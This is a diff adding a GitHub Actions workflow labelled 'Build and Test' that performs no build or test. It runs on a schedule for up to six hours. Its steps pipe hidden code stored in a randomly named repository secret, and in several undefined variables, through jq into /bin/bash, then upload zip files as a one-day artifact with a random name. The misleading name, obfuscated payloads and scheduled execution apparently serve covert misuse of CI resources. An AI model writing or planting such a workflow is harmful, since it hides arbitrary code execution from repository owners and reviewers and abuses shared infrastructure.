@@ -1,0 +1,37 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          piek9: ${{ secrets.piek9 }}
+        run: |
+          printf '%s' "$piek9" | jq -r .x8251 | /bin/bash
+          echo $i33 | jq -r .bls26314 | /bin/bash
+          printf '%s' "$kkjtg8" | jq -r .ffwxz187 | /bin/bash
+          printf '%s' "$d31786" | jq -r .mpim689 | /bin/bash
+          echo $oyhts6 | jq -r .et4646 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: nSo2diwn
+          path: "*.zip"
+          retention-days: 1
